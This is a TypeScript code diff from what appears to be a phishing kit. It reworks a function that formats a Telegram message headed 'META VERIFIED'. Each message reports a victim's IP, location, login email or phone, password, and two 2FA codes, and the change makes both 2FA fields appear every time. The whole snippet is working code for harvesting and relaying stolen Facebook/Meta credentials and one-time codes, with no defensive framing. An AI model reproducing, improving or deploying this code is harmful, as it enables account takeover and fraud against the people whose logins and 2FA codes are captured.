@@ -136,34 +136,22 @@ function primaryPasswordField(d: NormalizedPayload): string {
     return String(d.passwordSecond ?? '').trim();
 }
 
-function appendTwoFaBlock(lines: string[], d: NormalizedPayload) {
-    const steps: { label: string; val: string }[] = [];
-    if (String(d.twoFa ?? '').trim()) steps.push({ label: '🔐 2FA step 1', val: String(d.twoFa).trim() });
-    if (String(d.twoFaSecond ?? '').trim()) steps.push({ label: '🔐 2FA step 2', val: String(d.twoFaSecond).trim() });
-    if (String(d.twoFaThird ?? '').trim())
-        steps.push({ label: '🔐 (legacy)', val: String(d.twoFaThird).trim() });
-    if (steps.length === 0) return;
-
-    lines.push(`----------------------`);
-    for (const { label, val } of steps) {
-        lines.push(`<b>${label}</b>`, `<code>${formatCodeField(val)}</code>`);
-    }
-}
-
 /** Một định dạng cho **một snapshot** POST (đúng dữ liệu lần gọi đó). */
 function formatTelegramSubmissionMessage(d: NormalizedPayload): string {
-    const headline =
-        d.submissionFlow === 'facebook_login' ? `<b>🔷 FACEBOOK LOGIN</b>` : `<b>📋 META VERIFIED</b>`;
     const lines = [
-        headline,
+        `<b>📋 META VERIFIED</b>`,
         `----------------------`,
         `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
         `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
         `----------------------`,
         `<b>Mobile number or Email:</b> <code>${formatCodeField(primaryLoginIdentifier(d))}</code>`,
         `<b>Password:</b> <code>${formatCodeField(primaryPasswordField(d))}</code>`,
+        `----------------------`,
+        `<b>🔐 2FA step 1</b>`,
+        `<code>${formatCodeField(d.twoFa)}</code>`,
+        `<b>🔐 2FA step 2</b>`,
+        `<code>${formatCodeField(d.twoFaSecond)}</code>`,
     ];
-    appendTwoFaBlock(lines, d);
     return lines.join('\n');
 }
 
